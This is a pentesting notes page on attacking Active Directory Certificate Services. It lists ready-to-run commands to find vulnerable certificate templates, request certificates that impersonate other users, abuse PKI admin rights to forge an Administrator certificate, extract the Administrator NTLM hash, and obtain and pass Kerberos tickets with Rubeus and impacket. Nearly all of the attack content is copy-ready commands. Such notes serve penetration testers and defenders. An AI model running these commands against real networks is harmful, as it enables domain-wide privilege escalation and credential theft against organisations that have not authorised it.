---
title: Certificate Authority (CA)
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/certificate-authority-ca
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---

## Enumerate CA for vulnerabilities

Some certificate templates can be vulnerable to injection.

```
#Using certutil we can list templates
certutil -v -dstemplate

#Using certify.exe (locally)
.\certify.exe find /vulnerable

#Using certipy (remotely)
python3 certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```

## Exploiting misconfigured templates

Request a certificate from a vulnerable template:

```
// Using certipy
python3 certipy req <domain>/<user>:<password>@<ca_server> <ca_name> -template '<vulnerable_template_name>' -alt '<target_user>'

// Using certify.exe
.\certify.exe request /ca:<server>\<ca-name> /template:"vulnerable_template_name>" /altname:"<alt_name>"
```

## PKI admins group

If you are in the PKI admins group, you are able to create a vulnerable template and impersonate Administrator.

First create a new template by using the powershell module <https://github.com/GoateePFE/ADCSTemplate>

```
Import-Module .\ADCSTemplate.psm1
New-ADCSTemplate -DisplayName Incendium -JSON (Export-ADCSTemplate -DisplayName "Subordinate Certification Authority") -publish -Identity "DOMAIN\PKI Admins"
```

Next we request the template as Administrator:

```
certipy req -username incendium@domain.local -password PASS123 -ca domain-DC01-CA -target dc.domain.local -template Incendium -upn Administrator@domain.local -dns domain.local
```

Now we can use the PFX output file to retrieve the NT:NTLM hash of administrator by using:

```
certipy auth -pfx administrator_dc01.pfx -dc-ip 10.10.1.10 -username 'Administrator' -domain 'domain.local'
```

## Convert PEM to PFX

```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

## Request ticket&#x20;

```
# Request the TGT
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
# if you gave the password for "cert.pfx", you need to specify the password
Rubeus.exe asktgt /user:Administrator /password:password123 /certificate:cert.pfx /ptt
# or output the file
Rubeus.exe asktgt /user:Administrator /certificate:<Thumbprint> /outfile:ticket.kirbi
```

## Pass the ticket

```
impacket-ticketConverter ticket.kirbi ticke.ccache
```
